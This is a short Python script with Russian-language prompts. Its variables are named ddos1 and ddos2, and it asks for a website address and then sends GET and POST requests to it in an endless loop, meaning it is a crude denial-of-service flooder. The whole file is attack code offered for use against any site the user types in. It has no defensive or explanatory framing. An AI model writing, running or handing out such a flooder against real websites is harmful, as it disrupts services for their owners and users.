import requests

ddos1 = requests.get
ddos2 = requests.post

URL = input("Адрес сайта: ")

while True:
           try:
               ddos1(URL)
               print("Запрос отравлен!")
           except requests.exceptions.ConnectionError:
                                                      print("Ошибка отправки!")

           try:
               ddos2(URL)
               print("Запрос отравлен!")
           except requests.exceptions.ConnectionError:
                                                      print("Ошибка отправки!")